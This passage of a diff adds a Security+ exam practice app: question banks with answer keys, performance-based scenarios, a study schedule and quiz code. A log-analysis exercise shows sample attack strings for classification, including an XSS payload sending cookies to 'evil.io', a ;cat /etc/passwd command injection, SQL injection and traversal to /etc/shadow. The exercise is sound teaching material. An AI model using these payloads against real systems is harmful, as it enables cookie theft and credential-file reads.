+[4,"After applying a patch for a reported vulnerability, what should the analyst do NEXT?",["Rescan to validate remediation","Close the ticket immediately","Perform a tabletop exercise","Purchase cyber insurance"],"Validation (rescanning) confirms the fix worked."],
+[4,"Which tool aggregates and correlates logs from many sources and generates alerts?",["SIEM","DLP","NetFlow","FIM"],"Security Information and Event Management centralizes and correlates events."],
+[4,"Which technology automates incident response actions using playbooks?",["SOAR","SIEM","SCAP","NAC"],"Security Orchestration, Automation and Response executes automated playbooks."],
+[4,"A firewall has an 'allow any any' rule at the top and a 'deny 10.0.0.5' rule below it. What happens to traffic from 10.0.0.5?",["It is allowed, because the first matching rule wins","It is denied, because deny rules take precedence","It is dropped by implicit deny","It is logged but not forwarded"],"Firewall rules are processed top-down; the first match is applied."],
+[4,"Which IDS detection method is BEST at detecting previously unknown attacks?",["Anomaly/behavior-based","Signature-based","Hash-based","Allow list"],"Anomaly detection flags deviations from a baseline, catching new attacks (with more false positives)."],
+[4,"Which DNS record specifies which mail servers are allowed to send email for a domain?",["SPF","DKIM","DMARC","MX"],"Sender Policy Framework lists authorized sending servers in a TXT record."],
+[4,"Which email standard tells receiving servers what to do with messages that fail SPF/DKIM checks and sends reports?",["DMARC","SPF","DKIM","S/MIME"],"DMARC defines policy (none/quarantine/reject) and reporting."],
+[4,"Which tool would alert when a critical system file in C:\\Windows\\System32 is modified?",["File integrity monitoring","DLP","Web filter","Load balancer"],"FIM compares file hashes to a baseline."],
+[4,"A company wants to stop employees from emailing spreadsheets containing customer SSNs. Which tool should it use?",["DLP","IPS","EDR","WAF"],"Data Loss Prevention inspects content and blocks sensitive data from leaving."],
+[4,"Which protocol should replace Telnet for remote administration?",["SSH","SNMPv2","FTP","HTTP"],"SSH (port 22) encrypts the session."],
+[4,"A user logs into one portal and can access email, HR and CRM apps without logging in again. The apps use XML-based assertions from an identity provider. What is in use?",["SAML","OAuth","Kerberos","TACACS+"],"SAML uses XML assertions between IdP and service providers for web SSO."],
+[4,"A fitness app requests permission to read your calendar from another service without getting your password. Which protocol is this?",["OAuth","SAML","LDAP","RADIUS"],"OAuth provides delegated authorization via access tokens."],
+[4,"Files are labeled Secret and Top Secret, and users can access only data at or below their clearance. Which access control model is this?",["MAC","DAC","RBAC","ABAC"],"Mandatory Access Control uses labels and clearances set by administrators."],
+[4,"Access is granted only if the user is in Finance, on a managed device, in the US, during business hours. Which model is this?",["ABAC","RBAC","DAC","MAC"],"Attribute-based access control evaluates many attributes."],
+[4,"Which is an example of multifactor authentication?",["Password and a code from an authenticator app","Password and a security question","Fingerprint and a retina scan","PIN and a password"],"MFA requires different factor categories: something you know + something you have."],
+[4,"Increasing a fingerprint reader's sensitivity rejects more legitimate users. Which metric increased?",["False rejection rate","False acceptance rate","Crossover error rate","Mean time to repair"],"FRR is legitimate users being rejected."],
+[4,"Admins receive elevated rights only for a 2-hour window after approval, which then expire automatically. What is this?",["Just-in-time permissions","Password vaulting","Role-based access","Federation"],"JIT access grants privileges only when needed, a core PAM concept."],
+[4,"During an incident, the team has identified infected hosts. What should they do NEXT according to the IR process?",["Containment","Eradication","Recovery","Lessons learned"],"After detection and analysis comes containment, before eradication."],
+[4,"Which should a forensic analyst collect FIRST?",["RAM contents","Hard drive image","Archived backups","Remote syslog data"],"Order of volatility: registers/cache, then RAM, then disk, then remote logs, then backups."],
+[4,"Which document records every person who handled evidence and when?",["Chain of custody","Legal hold","Rules of engagement","Risk register"],"Chain of custody maintains evidence integrity for legal proceedings."],
+[4,"Legal counsel instructs IT to preserve all email for a group of employees because of pending litigation. What is this?",["Legal hold","E-discovery","Data retention policy","Chain of custody"],"A legal hold requires preserving relevant data and suspending deletion."],
+[4,"Security analysts proactively search for threats that evaded existing controls. What is this?",["Threat hunting","Vulnerability scanning","Penetration testing","Root cause analysis"],"Threat hunting assumes compromise and searches proactively."],
+[4,"Which data source provides the MOST detail about the contents of a suspicious network session?",["Packet capture","NetFlow","Firewall log","SNMP trap"],"Packet captures contain full payloads; NetFlow has only metadata."],
+
+// ---------- Domain 5 (20) ----------
+[5,"Which document type contains step-by-step instructions for onboarding a new employee?",["Procedure","Policy","Guideline","Standard"],"Procedures are detailed steps. Policies are high-level; standards are specific mandatory requirements."],
+[5,"Which role is ultimately accountable for a dataset and decides its classification?",["Data owner","Data custodian","Data processor","Data subject"],"The owner (often a senior manager) is accountable; the custodian handles day-to-day care."],
+[5,"Under privacy regulations, the organization that decides why and how personal data is processed is the:",["Controller","Processor","Custodian","Data subject"],"The controller decides purposes and means; the processor acts on the controller's behalf."],
+[5,"A server is worth $100,000. A fire would destroy 40% of it. What is the SLE?",["$40,000","$100,000","$4,000","$60,000"],"SLE = AV × EF = $100,000 × 0.40 = $40,000."],
+[5,"SLE is $40,000 and a fire is expected once every 10 years. What is the ALE?",["$4,000","$40,000","$400,000","$10,000"],"ALE = SLE × ARO = $40,000 × 0.1 = $4,000."],
+[5,"A company buys cyber insurance to cover ransomware losses. Which risk strategy is this?",["Transfer","Accept","Avoid","Mitigate"],"Insurance shifts financial impact to a third party."],
+[5,"A company discontinues a product line because its security risk is too high. Which risk strategy is this?",["Avoid","Transfer","Accept","Mitigate"],"Avoidance stops the risky activity entirely."],
+[5,"The business states it can lose no more than 4 hours of transaction data. What metric is this?",["RPO","RTO","MTTR","MTBF"],"Recovery Point Objective is maximum tolerable data loss measured in time."],
+[5,"A critical system must be back online within 2 hours of an outage. What metric is this?",["RTO","RPO","MTBF","ARO"],"Recovery Time Objective is the maximum downtime."],
+[5,"Which document tracks identified risks, owners, likelihood, impact and responses?",["Risk register","SLA","Business impact analysis","Asset inventory"],"The risk register is the central record of risks."],
+[5,"A vendor contract allows the customer to inspect the vendor's security controls. What clause is this?",["Right-to-audit","Non-disclosure","Indemnification","Service level"],"A right-to-audit clause permits assessment of the vendor."],
+[5,"Which agreement defines guaranteed uptime and penalties for a cloud provider?",["SLA","MOU","NDA","BPA"],"A Service Level Agreement specifies performance metrics."],
+[5,"Which agreement establishes general terms for future projects, with details defined in separate work orders?",["MSA","SOW","NDA","MOU"],"A Master Service Agreement sets overall terms; SOWs specify each engagement."],
+[5,"Which non-binding document expresses intent between two parties to work together?",["MOU","SLA","MSA","SOW"],"A Memorandum of Understanding states intent and is usually not legally binding."],
+[5,"Which standard applies to organizations that process credit card payments?",["PCI DSS","HIPAA","GDPR","FERPA"],"Payment Card Industry Data Security Standard."],
+[5,"An EU citizen asks a company to delete all their personal data. Which right is this?",["Right to be forgotten","Data sovereignty","Legal hold","Data minimization"],"GDPR grants the right to erasure (right to be forgotten)."],
+[5,"A penetration tester receives network diagrams, source code and credentials before testing. Which environment is this?",["Known environment","Unknown environment","Partially known environment","Passive reconnaissance"],"Known (white box) testing provides full information."],
+[5,"A tester gathers employee names from LinkedIn and public DNS records without touching the target's systems. What is this?",["Passive reconnaissance","Active reconnaissance","Vulnerability scanning","Pivoting"],"Passive recon uses OSINT without directly interacting with the target."],
+[5,"Which document defines the scope, timing and permitted techniques of a penetration test?",["Rules of engagement","SLA","Acceptable use policy","Risk register"],"Rules of engagement set the boundaries for testing."],
+[5,"After a simulated phishing campaign, which metric BEST measures the effectiveness of awareness training over time?",["Change in click and report rates across campaigns","Number of firewall rules","Number of patches deployed","Total emails received"],"Fewer clicks and more reports over repeated campaigns indicate improving awareness."],
+[5,"Red and blue teams work together, sharing findings in real time to improve defenses. What is this?",["Purple team","White team","Bug bounty","Tabletop exercise"],"A purple team integrates offensive and defensive efforts."],
+[5,"Which risk appetite describes an organization willing to take on more risk to pursue growth?",["Expansionary","Conservative","Neutral","Avoidant"],"An expansionary appetite accepts higher risk for opportunity."],
+[5,"Which metric describes the average time a component operates before failing?",["MTBF","MTTR","RTO","RPO"],"Mean Time Between Failures measures reliability."]
+];
+
+// PBQ part types:
+//  select: rows [{label, sel:[[answer, poolKey], ...]}], pools {key:[options]}, cols (optional header labels)
+//  order:  items in CORRECT order (shuffled at runtime)
+//  number: rows [{label, answer}]
+const PBQ = [
+{
+ id:"attacks", title:"Identify the attack", dom:"Domain 2",
+ scenario:"A SOC analyst is reviewing eight reports. Choose the attack that BEST matches each one.",
+ parts:[{type:"select", cols:["Report","Attack"],
+  pools:{a:["Phishing","Spear phishing","Whaling","Vishing","Smishing","Watering hole","Typosquatting","Evil twin","Password spraying","Brute force","On-path (ARP poisoning)","Replay","Ransomware","Logic bomb","Rootkit","Worm"]},
+  rows:[
+   {label:"A text message says your package is held and links to a fake shipping site.", sel:[["Smishing","a"]]},
+   {label:"The CEO receives a tailored email about a board lawsuit with a malicious PDF.", sel:[["Whaling","a"]]},
+   {label:"Users visiting 'micr0soft-support.com' are prompted for credentials.", sel:[["Typosquatting","a"]]},
+   {label:"Auth logs show 400 accounts each failing once with 'Spring2026!'.", sel:[["Password spraying","a"]]},
+   {label:"A coffee shop AP named 'CorpGuest' is not owned by the company and harvests logins.", sel:[["Evil twin","a"]]},
+   {label:"Files across the file server now end in .locked and a README demands Bitcoin.", sel:[["Ransomware","a"]]},
+   {label:"Malware spreads from host to host over SMB with no user interaction.", sel:[["Worm","a"]]},
+   {label:"The default gateway's MAC address in hosts' ARP tables changes to an unknown workstation.", sel:[["On-path (ARP poisoning)","a"]]}
+  ]}],
+ explain:"Smishing = SMS. Whaling = executive-targeted. Typosquatting = look-alike domain. One password × many accounts = spraying. Rogue look-alike SSID = evil twin. Encrypted files + ransom note = ransomware. Self-propagating = worm. Changed gateway MAC = ARP poisoning enabling an on-path attack."
+},
+{
+ id:"firewall", title:"Configure the firewall", dom:"Domain 3 / 4",
+ scenario:`<p>Configure the perimeter firewall ACL to meet these requirements. Rules are processed top-down.</p>
+<ul>
+<li>Anyone on the Internet can reach the public web server <code>10.1.1.10</code> securely.</li>
+<li>Only the admin subnet <code>10.0.5.0/24</code> can manage the web server using an encrypted remote shell.</li>
+<li>The DMZ DNS server <code>10.1.1.53</code> answers DNS queries from anyone.</li>
+<li>Insecure remote management to the web server must be explicitly blocked.</li>
+<li>Everything else is denied.</li>
+</ul>`,
+ parts:[{type:"select", cols:["#","Source","Destination","Port","Action"],
+  pools:{p:["ANY","21","22","23","25","53","80","443","3389"], x:["ALLOW","DENY"]},
+  rows:[
+   {label:"1|ANY|10.1.1.10", sel:[["443","p"],["ALLOW","x"]]},
+   {label:"2|10.0.5.0/24|10.1.1.10", sel:[["22","p"],["ALLOW","x"]]},
+   {label:"3|ANY|10.1.1.53", sel:[["53","p"],["ALLOW","x"]]},
+   {label:"4|ANY|10.1.1.10", sel:[["23","p"],["DENY","x"]]},
+   {label:"5|ANY|ANY", sel:[["ANY","p"],["DENY","x"]]}
+  ]}],
+ explain:"HTTPS = 443, SSH = 22 (encrypted), DNS = 53, Telnet = 23 (insecure — deny). The final ANY/ANY/DENY rule is the explicit 'deny all'. On the real exam, watch for rule order: a broad ALLOW above a specific DENY overrides it."
+},
+{
+ id:"ir", title:"Incident response & forensics order", dom:"Domain 4",
+ scenario:"Part A: Put the incident response phases in the correct order. Part B: A compromised server is still running. Put the evidence in the order it should be collected.",
+ parts:[
+  {type:"order", title:"Part A — IR phases", items:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Lessons learned"]},
+  {type:"order", title:"Part B — Order of volatility", items:["CPU registers and cache","RAM","Swap / page file","Local disk image","Remote syslog server logs","Offsite backup tapes"]}
+ ],
+ explain:"IR: Preparation → Detection → Analysis → Containment → Eradication → Recovery → Lessons Learned. Volatility: collect what disappears fastest first — registers/cache, memory, swap/temp, disk, remote logs, archived media."
+},
+{
+ id:"logs", title:"Analyze the logs", dom:"Domain 2 / 4",
+ scenario:"Review each log entry from the web server and authentication server. Classify each one.",
+ parts:[{type:"select", cols:["Log entry","Classification"],
+  pools:{c:["Benign","SQL injection","Cross-site scripting","Directory traversal","Brute force","Password spraying","Impossible travel","Command injection"]},
+  rows:[
+   {label:"<code>GET /products?id=12' UNION SELECT username,password FROM users--</code>", sel:[["SQL injection","c"]]},
+   {label:"<code>GET /images/../../../../etc/shadow</code>", sel:[["Directory traversal","c"]]},
+   {label:"<code>POST /comment body=&lt;script&gt;fetch('//evil.io?c='+document.cookie)&lt;/script&gt;</code>", sel:[["Cross-site scripting","c"]]},
+   {label:"<code>GET /index.html 200 Mozilla/5.0</code>", sel:[["Benign","c"]]},
+   {label:"<code>GET /ping?host=8.8.8.8;cat /etc/passwd</code>", sel:[["Command injection","c"]]},
+   {label:"<code>08:01:02–08:01:40 user=jsmith FAIL ×312 from 203.0.113.9</code>", sel:[["Brute force","c"]]},
+   {label:"<code>user=akim login OK Chicago 09:00 · login OK Lagos 09:20</code>", sel:[["Impossible travel","c"]]},
+   {label:"<code>pw='Welcome1' FAIL user=alee, bchan, cdiaz, dlee … (240 users)</code>", sel:[["Password spraying","c"]]}
+  ]}],
+ explain:"UNION SELECT / quote = SQLi. ../ = traversal. &lt;script&gt; = XSS. ; followed by an OS command = command injection. Many passwords → one account = brute force; one password → many accounts = spraying. Logins from distant cities minutes apart = impossible travel."
+},
+{
+ id:"controls", title:"Classify the controls", dom:"Domain 1",
+ scenario:"For each control, choose its category AND its primary type.",
+ parts:[{type:"select", cols:["Control","Category","Type"],
+  pools:{k:["Technical","Managerial","Operational","Physical"], t:["Preventive","Deterrent","Detective","Corrective","Compensating","Directive"]},
+  rows:[
+   {label:"Bollards in front of the data center entrance", sel:[["Physical","k"],["Preventive","t"]]},
+   {label:"IDS that alerts on suspicious traffic", sel:[["Technical","k"],["Detective","t"]]},
+   {label:"Acceptable use policy employees must follow", sel:[["Managerial","k"],["Directive","t"]]},
+   {label:"Restoring a server from backup after ransomware", sel:[["Technical","k"],["Corrective","t"]]},
+   {label:"Security guard reviewing visitor logs each morning", sel:[["Operational","k"],["Detective","t"]]},
+   {label:"Login banner warning of prosecution for unauthorized use", sel:[["Technical","k"],["Deterrent","t"]]},
+   {label:"Isolated VLAN for an unpatchable legacy system", sel:[["Technical","k"],["Compensating","t"]]}
+  ]}],
+ explain:"Category = how it's implemented (tech, management decision, people performing it, physical). Type = what it does. A policy is managerial/directive; a guard reviewing logs is operational/detective; network isolation in place of patching is compensating."
+},
+{
+ id:"pki", title:"PKI & certificates", dom:"Domain 1",
+ scenario:"You manage the company's certificates. Choose the BEST answer for each task.",
+ parts:[{type:"select", cols:["Task","Answer"],
+  pools:{z:["Wildcard certificate","SAN certificate","Self-signed certificate","Code-signing certificate","Generate a CSR","Add to CRL / revoke","OCSP stapling","Certificate pinning","Key escrow",".pfx / .p12 file",".p7b file"]},
+  rows:[
+   {label:"Secure app.example.com, api.example.com and portal.example.com with one cert", sel:[["Wildcard certificate","z"]]},
+   {label:"Secure example.com, example.net and example.org with one cert", sel:[["SAN certificate","z"]]},
+   {label:"The web server's private key was stolen", sel:[["Add to CRL / revoke","z"]]},
+   {label:"First step to obtain a certificate from a public CA", sel:[["Generate a CSR","z"]]},
+   {label:"Prove internally developed PowerShell scripts haven't been altered", sel:[["Code-signing certificate","z"]]},
+   {label:"Export the certificate together with its private key for import on a new server", sel:[[".pfx / .p12 file","z"]]},
+   {label:"A mobile app should only trust the company's specific server certificate", sel:[["Certificate pinning","z"]]},
+   {label:"Reduce client queries to the CA when checking revocation", sel:[["OCSP stapling","z"]]}
+  ]}],
+ explain:"Wildcard = many subdomains of one domain; SAN = several different names. Compromised key → revoke (CRL/OCSP). CSR carries your public key to the CA. .pfx/.p12 bundles the private key; .p7b holds the chain only."
+},
+{
+ id:"placement", title:"Place the security devices", dom:"Domain 3",
+ scenario:"A company is redesigning its network with Internet → perimeter firewall → DMZ → internal firewall → internal LAN → server VLAN. Choose where each item belongs.",
+ parts:[{type:"select", cols:["Device / system","Location"],
+  pools:{l:["Internet edge (in front of perimeter firewall)","DMZ / screened subnet","Internal LAN","Server VLAN","Out-of-band management network"]},
+  rows:[
+   {label:"Public web server", sel:[["DMZ / screened subnet","l"]]},
+   {label:"WAF protecting the public web server", sel:[["DMZ / screened subnet","l"]]},
+   {label:"Customer database used by the web app", sel:[["Server VLAN","l"]]},
+   {label:"Reverse proxy for published sites", sel:[["DMZ / screened subnet","l"]]},
+   {label:"Employee workstations", sel:[["Internal LAN","l"]]},
+   {label:"Jump server for switch/router administration", sel:[["Out-of-band management network","l"]]},
+   {label:"DDoS scrubbing / ISP filtering", sel:[["Internet edge (in front of perimeter firewall)","l"]]}
+  ]}],
+ explain:"Public-facing services and their front-end protections sit in the DMZ. Sensitive data (databases) sits deeper on internal server segments. Admin access goes through a hardened jump server on a separate management network. DDoS mitigation must happen upstream, before traffic reaches your firewall."
+},
+{
+ id:"risk", title:"Quantitative risk analysis", dom:"Domain 5",
+ scenario:`<p>A file server is valued at <b>$250,000</b>. A ransomware incident would affect <b>60%</b> of its value. The company expects such an incident <b>once every 5 years</b>. A proposed EDR solution costs <b>$20,000 per year</b> and is expected to reduce the ARO to once every 25 years.</p><p>Enter whole dollar amounts (numbers only).</p>`,
+ parts:[{type:"number", rows:[
+   {label:"SLE", answer:150000},
+   {label:"ARO (current, as a decimal)", answer:0.2},
+   {label:"ALE (current)", answer:30000},
+   {label:"ALE with EDR", answer:6000},
+   {label:"Annual savings from EDR minus its cost", answer:4000}
+  ]},
+  {type:"select", cols:["Question","Answer"], pools:{y:["Yes — benefit exceeds cost","No — cost exceeds benefit"]},
+   rows:[{label:"Is the EDR purchase cost-justified?", sel:[["Yes — benefit exceeds cost","y"]]}]}],
+ explain:"SLE = 250,000 × 0.6 = 150,000. ARO = 1/5 = 0.2. ALE = 150,000 × 0.2 = 30,000. With EDR, ARO = 1/25 = 0.04 → ALE = 6,000. Reduction = 24,000 − cost 20,000 = 4,000 net benefit, so it is justified."
+},
+{
+ id:"protocols", title:"Secure the protocols", dom:"Domain 4",
+ scenario:"An audit found insecure protocols in use. Choose the secure replacement and its default port for each.",
+ parts:[{type:"select", cols:["Insecure protocol","Replacement","Port"],
+  pools:{r:["SSH","SFTP","HTTPS","LDAPS","SNMPv3","IMAPS","POP3S","SMTPS","DNSSEC"], n:["22","53","161","443","465","636","993","995"]},
+  rows:[
+   {label:"Telnet (23)", sel:[["SSH","r"],["22","n"]]},
+   {label:"FTP (21)", sel:[["SFTP","r"],["22","n"]]},
+   {label:"HTTP (80)", sel:[["HTTPS","r"],["443","n"]]},
+   {label:"LDAP (389)", sel:[["LDAPS","r"],["636","n"]]},
+   {label:"SNMPv2c (161)", sel:[["SNMPv3","r"],["161","n"]]},
+   {label:"IMAP (143)", sel:[["IMAPS","r"],["993","n"]]},
+   {label:"POP3 (110)", sel:[["POP3S","r"],["995","n"]]}
+  ]}],
+ explain:"SFTP runs over SSH, so it shares port 22. SNMPv3 adds authentication and encryption on the same port 161."
+},
+{
+ id:"iam", title:"Choose the access control", dom:"Domain 4",
+ scenario:"Match each requirement with the BEST identity or access technology.",
+ parts:[{type:"select", cols:["Requirement","Solution"],
+  pools:{m:["MAC","DAC","RBAC","ABAC","Rule-based","SAML","OAuth","OpenID Connect","Kerberos","802.1X","Just-in-time access","Password vaulting","Federation"]},
+  rows:[
+   {label:"All nurses get the same EHR permissions based on job function", sel:[["RBAC","m"]]},
+   {label:"Classified documents require matching clearance labels", sel:[["MAC","m"]]},
+   {label:"File owner shares a folder with chosen coworkers", sel:[["DAC","m"]]},
+   {label:"Access allowed only from managed devices in the US during business hours", sel:[["ABAC","m"]]},
+   {label:"Users at a partner company log in with their own corporate credentials", sel:[["Federation","m"]]},
+   {label:"Third-party app reads a user's cloud storage without the user's password", sel:[["OAuth","m"]]},
+   {label:"Wired switch ports authenticate devices against RADIUS before granting access", sel:[["802.1X","m"]]},
+   {label:"Shared admin passwords are checked out, rotated and recorded", sel:[["Password vaulting","m"]]}
+  ]}],
+ explain:"Roles → RBAC. Labels → MAC. Owner chooses → DAC. Multiple contextual attributes → ABAC. Trust between organizations → federation. Delegated authorization → OAuth. Port-based NAC → 802.1X. PAM vaults check out and rotate privileged credentials."
+}
+];
+
+const DOMAINS = {1:"General Security Concepts",2:"Threats, Vulnerabilities & Mitigations",3:"Security Architecture",4:"Security Operations",5:"Program Management & Oversight"};
+const EXAM_MIX = {1:11,2:20,3:16,4:25,5:18}; // 90 questions, matches SY0-701 weights
+const PLAN = [
+ ["Thu Nov 5","Domain 1 — General Security Concepts","Controls, CIA/AAA, Zero Trust, change management, crypto & PKI. Do the Domain 1 quiz + 'Classify the controls' and 'PKI' PBQs.",["d1"]],
+ ["Fri Nov 6","Domain 2 (part 1) — Actors, vectors, vulnerabilities","Threat actors & motivations, social engineering, vulnerability types (2.1–2.3).",["d2"]],
+ ["Sat Nov 7","Domain 2 (part 2) — Indicators & mitigations","Malware, network/app/password attacks, indicators, mitigations (2.4–2.5). Domain 2 quiz + 'Identify the attack' and 'Analyze the logs' PBQs.",["d2"]],
+ ["Sun Nov 8","Domain 3 — Security Architecture","Cloud models, network design, data protection, resilience & backups. Domain 3 quiz + 'Place the devices' and 'Firewall' PBQs.",["d3"]],
+ ["Mon Nov 9","Domain 4 (part 1) — Hardening, assets, vulns, monitoring","4.1–4.5: wireless/mobile, asset disposal, vuln management, SIEM, email security, firewall/IDS.",["d4"]],
+ ["Tue Nov 10","Domain 4 (part 2) — IAM, automation, IR, forensics","4.6–4.9. Domain 4 quiz + 'IR order', 'Protocols' and 'Access control' PBQs.",["d4"]],
+ ["Wed Nov 11","Domain 5 — Program Management & Oversight","Governance, risk formulas, BIA, vendor agreements, compliance, audits. Domain 5 quiz + 'Risk analysis' PBQ.",["d5"]],
+ ["Thu Nov 12","Full practice exam #1","Take a timed 90-question exam. Review every miss and re-read those sections. Retake 'Missed questions'.",[]],
+ ["Fri Nov 13","All PBQs + full practice exam #2","Do all 10 PBQs without notes. Memorize ports and confusing pairs from the Cheat Sheet. Second timed exam.",[]],
+ ["Sat Nov 14","Light review & rest","Cheat Sheet only, missed questions, one domain quiz for your weakest area. Stop by early evening and sleep.",[]],
+ ["Sun Nov 15","EXAM DAY","Light breakfast, skim the Cheat Sheet, arrive early. Flag PBQs, do the MCQs first, then come back.",[]]
+];
+
+const store = {
+  get(k, d){ try{ const v = localStorage.getItem("secplus_"+k); return v ? JSON.parse(v) : d; }catch(e){ return d; } },
+  set(k, v){ try{ localStorage.setItem("secplus_"+k, JSON.stringify(v)); }catch(e){} }
+};
+const $ = s => document.querySelector(s);
+const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const shuffle = a => { a = a.slice(); for(let i=a.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); [a[i],a[j]]=[a[j],a[i]]; } return a; };
+
+/* ---------- tabs / routing ---------- */
+const TABS = ["plan","guide","practice","pbq","cheat"];
+function show(tab){
+  if(!TABS.includes(tab)) tab = "plan";
+  TABS.forEach(t => { $("#v-"+t).hidden = t!==tab; $("#t-"+t).classList.toggle("on", t===tab); });
+  window.scrollTo(0,0);
+}
+window.addEventListener("hashchange", () => show(location.hash.slice(1)));
+
+/* ---------- plan ---------- */
+function renderPlan(){
+  const done = store.get("plan", {});
+  $("#planList").innerHTML = PLAN.map((p,i) => `
+   <label class="day ${done[i]?"done":""}">
+     <input type="checkbox" data-i="${i}" ${done[i]?"checked":""}>
+     <div><div class="dd">${p[0]}</div><div class="dt">${p[1]}</div><div class="dx">${p[2]}</div>
+     ${p[3].map(d=>`<a href="#guide" data-jump="${d}" class="jump">Open notes →</a>`).join("")}</div>
+   </label>`).join("");
+  $("#planList").onchange = e => { const d = store.get("plan",{}); d[e.target.dataset.i] = e.target.checked; store.set("plan", d); renderPlan(); };
+  $("#planList").onclick = e => { const j = e.target.dataset.jump; if(j){ e.preventDefault(); location.hash="guide"; setTimeout(()=>document.getElementById(j).scrollIntoView(),50); } };
+}
+
+/* ---------- practice ---------- */
+let quiz = null;
+function startQuiz(mode){
+  let pool;
+  if(mode==="exam"){ pool = []; for(const d in EXAM_MIX){ pool = pool.concat(shuffle(QB.filter(q=>q[0]==d)).slice(0,EXAM_MIX[d])); } pool = shuffle(pool); }
+  else if(mode==="missed"){ const m = store.get("missed",[]); pool = shuffle(QB.filter(q=>m.includes(q[1]))); if(!pool.length){ $("#quizArea").innerHTML = `<p class="note">No missed questions saved yet. Take a quiz first.</p>`; return; } }
+  else if(mode==="all"){ pool = shuffle(QB); }
+  else { pool = shuffle(QB.filter(q=>q[0]==mode)); }
+  quiz = { mode, items: pool.map(q => ({q, opts: shuffle(q[2]), pick:null})), i:0, instant: mode==="exam" ? false : $("#instant").checked, start: Date.now(), limit: mode==="exam" ? 90*60 : 0 };
+  if(quiz.timer) clearInterval(quiz.timer);
+  if(quiz.limit){ quiz.timer = setInterval(tick, 1000); }
+  $("#quizSetup").hidden = true;
+  renderQ();
+}
+function tick(){
+  if(!quiz || !quiz.limit) return;
+  const left = quiz.limit - Math.floor((Date.now()-quiz.start)/1000);
+  const el = $("#timer"); if(el) el.textContent = (left<0?"0:00":Math.floor(left/60)+":"+String(left%60).padStart(2,"0"));
+  if(left<=0){ clearInterval(quiz.timer); finishQuiz(); }
+}
+function renderQ(){
+  const it = quiz.items[quiz.i], n = quiz.items.length;
+  const answered = it.pick!==null;
+  const correct = it.q[2][0];
+  $("#quizArea").innerHTML = `
+   <div class="qhead"><span>Question ${quiz.i+1} of ${n} · Domain ${it.q[0]}</span>${quiz.limit?`<span class="timer">⏱ <b id="timer"></b></span>`:""}</div>
+   <div class="prog"><div style="width:${(quiz.i/n)*100}%"></div></div>
+   <h3 class="qtext">${esc(it.q[1])}</h3>
+   <div class="opts">${it.opts.map((o,k)=>{
+     let cls="";
+     if(answered && quiz.instant){ if(o===correct) cls="right"; else if(o===it.pick) cls="wrong"; }
+     else if(o===it.pick) cls="picked";
+     return `<button class="opt ${cls}" data-o="${esc(o)}" ${answered&&quiz.instant?"disabled":""}><span class="ltr">${"ABCD"[k]}</span>${esc(o)}</button>`;}).join("")}</div>
+   ${answered && quiz.instant ? `<div class="exp ${it.pick===correct?"ok":"no"}"><b>${it.pick===correct?"Correct.":"Not quite — answer: "+esc(correct)}</b><br>${esc(it.q[3])}</div>`:""}
+   <div class="qnav">
+     <button class="btn ghost" id="prevQ" ${quiz.i===0?"disabled":""}>← Back</button>
+     <button class="btn ghost" id="quitQ">End &amp; score</button>
+     <button class="btn" id="nextQ">${quiz.i===n-1?"Finish":"Next →"}</button>
+   </div>`;
+  tick();
+  $("#quizArea").querySelectorAll(".opt").forEach(b => b.onclick = () => { it.pick = b.dataset.o; renderQ(); });
+  $("#prevQ").onclick = () => { quiz.i--; renderQ(); };
+  $("#nextQ").onclick = () => { if(quiz.i===n-1) finishQuiz(); else { quiz.i++; renderQ(); } };
+  $("#quitQ").onclick = finishQuiz;
+}
+function finishQuiz(){
+  if(quiz.timer) clearInterval(quiz.timer);
+  const missed = new Set(store.get("missed",[]));
+  const byD = {}; let right=0;
+  quiz.items.forEach(it => { const d=it.q[0]; byD[d]=byD[d]||[0,0]; byD[d][1]++; if(it.pick===it.q[2][0]){ right++; byD[d][0]++; missed.delete(it.q[1]); } else if(it.pick!==null) missed.add(it.q[1]); });
+  store.set("missed",[...missed]);
+  const total = quiz.items.length, pct = Math.round(right/total*100);
+  const hist = store.get("history",[]); hist.push({d:new Date().toISOString().slice(0,10), mode:quiz.mode, pct, n:total}); store.set("history", hist.slice(-30));
+  const mins = Math.round((Date.now()-quiz.start)/60000);
+  $("#quizArea").innerHTML = `
+   <div class="result ${pct>=85?"pass":pct>=75?"close":"fail"}">
+     <div class="big">${pct}%</div><div>${right} of ${total} correct · ${mins} min</div>
+     <div class="verdict">${pct>=85?"Exam-ready on this set. Keep it up.":pct>=75?"Borderline — review your misses before exam day.":"Not there yet — reread the weak domains below."}</div>
+   </div>
+   <h3>By domain</h3>
+   <div class="bars">${Object.keys(byD).sort().map(d=>{const p=Math.round(byD[d][0]/byD[d][1]*100);return `<div class="bar"><span>${d}. ${DOMAINS[d]}</span><div class="track"><div class="fill ${p>=85?"g":p>=75?"y":"r"}" style="width:${p}%"></div></div><b>${byD[d][0]}/${byD[d][1]}</b></div>`;}).join("")}</div>
+   <h3>Review</h3>
+   <div class="review">${quiz.items.map((it,k)=>{const ok=it.pick===it.q[2][0];return `<details ${ok?"":"open"} class="${ok?"ok":"no"}"><summary>${ok?"✓":"✗"} ${k+1}. ${esc(it.q[1])}</summary><p>Your answer: <b>${it.pick?esc(it.pick):"(blank)"}</b><br>Correct: <b>${esc(it.q[2][0])}</b></p><p class="muted">${esc(it.q[3])}</p></details>`;}).join("")}</div>
+   <div class="qnav"><button class="btn" id="again">New quiz</button></div>`;
+  $("#again").onclick = () => { $("#quizSetup").hidden=false; $("#quizArea").innerHTML=""; renderHistory(); };
+  quiz = null;
+  renderHistory();
+}
+function renderHistory(){
+  const h = store.get("history",[]), m = store.get("missed",[]);
+  $("#missedCount").textContent = m.length;
+  $("#history").innerHTML = h.length ? `<h3>Recent scores</h3><div class="hist">${h.slice(-10).reverse().map(x=>`<span class="${x.pct>=85?"g":x.pct>=75?"y":"r"}">${x.d} · ${x.mode==="exam"?"Full exam":x.mode==="all"?"All":x.mode==="missed"?"Missed":"Domain "+x.mode} · <b>${x.pct}%</b></span>`).join("")}</div>` : "";
+}
+
+/* ---------- PBQs ---------- */
+function renderPBQList(){
+  const done = store.get("pbq",{});
+  $("#pbqList").innerHTML = PBQ.map((p,i)=>`<button class="pcard" data-i="${i}"><span class="pd">${p.dom}</span><b>${i+1}. ${p.title}</b>${done[p.id]!=null?`<span class="ps ${done[p.id]>=80?"g":"y"}">Best ${done[p.id]}%</span>`:`<span class="ps">Not attempted</span>`}</button>`).join("");
+  $("#pbqList").querySelectorAll(".pcard").forEach(b=>b.onclick=()=>openPBQ(+b.dataset.i));
